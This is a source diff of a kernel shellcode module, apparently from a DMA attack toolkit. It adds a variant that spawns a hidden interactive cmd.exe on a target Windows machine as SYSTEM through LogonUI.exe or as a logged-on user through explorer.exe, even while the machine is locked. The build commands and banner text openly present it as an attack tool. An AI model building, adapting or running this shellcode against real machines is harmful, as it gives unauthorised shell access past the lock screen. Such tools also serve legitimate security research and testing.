@@ -12,9 +12,15 @@
 //
 // ALTERNATIVELY (wx64_pscmd):
 // cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
-// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD wx64_pscreate.c
+// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD /D_PSCMD_SYSTEM wx64_pscreate.c
 // ml64 wx64_common_a.asm /Fewx64_pscmd.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
 // shellcode64.exe -o wx64_pscmd.exe "PROCESS CREATOR - AUTOMATICALLY SPAWN CMD.EXE ON TARGET!        \n================================================================\nAutomatically spawn a CMD.EXE on the target system. This utility\nonly work if the target system is locked and the login screen is\nvisible. If it takes time waiting - then please touch any key on\nthe target system.   If the utility fails multiple times, please\ntry wx64_pscreate instead.                                      \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT ======%s\nNTSTATUS        : 0x%08X                                        \nADDITIONAL INFO : 0x%04X                                        \n================================================================\n"
+//
+// ALTERNATIVELY (wx64_pscmd_user):
+// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
+// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD /D_PSCMD_USER wx64_pscreate.c
+// ml64 wx64_common_a.asm /Fewx64_pscmd_user.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
+// shellcode64.exe -o wx64_pscmd_user.exe "PROCESS CREATOR - AUTOMATICALLY SPAWN CMD.EXE AS USER ON TARGET!        \n================================================================\nAutomatically spawn a CMD.EXE on the target system. This utility\nwill spawn a cmd.exe in the context of a random logged on user.\nThis will work even though the computer may be locked. If this\nutility fails multiple times, please try wx64_pscreate instead.                                      \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT ======%s\nNTSTATUS        : 0x%08X                                        \nADDITIONAL INFO : 0x%04X                                        \n================================================================\n"
 #include "wx64_common.h"
 
 #define MAGIC_WAIT_WORD					0x01234123412341234
@@ -717,13 +723,18 @@ VOID c_EntryPoint(_In_ PKMDDATA pk)
 	KERNEL_FUNCTIONS2 fnk2;
 	InitializeKernelFunctions(pk->AddrKernelBase, &fnk);
 	InitializeKernelFunctions2(pk->AddrKernelBase, &fnk2);
+#ifdef _PSCMD_SYSTEM
+	CHAR szBINARY[] = { 'L', 'o', 'g', 'o', 'n', 'U', 'I', '.', 'e', 'x', 'e', 0 };
+#endif _PSCMD_SYSTEM
+#ifdef _PSCMD_USER
+	CHAR szBINARY[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', 0 };
+#endif _PSCMD_USER
 #ifdef _PSCMD
-	CHAR szLOGONUI[] = { 'L', 'o', 'g', 'o', 'n', 'U', 'I', '.', 'e', 'x', 'e', 0 };
 	CHAR szCMD[] = { 'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', 0 };
 	pk->dataIn[1] = 0x08000000; // hidden window
 	pk->dataIn[2] = 1; // interactive
 	pk->dataIn[4] = 1; // multi thread hijack (boost)
-	pk->dataOut[0] = GetPidFromPsName(&fnk, &fnk2, szLOGONUI, &pk->dataIn[0]);
+	pk->dataOut[0] = GetPidFromPsName(&fnk, &fnk2, szBINARY, &pk->dataIn[0]);
 	if(pk->dataOut[0]) {
 		pk->dataOut[1] = 0x101;
 		return;
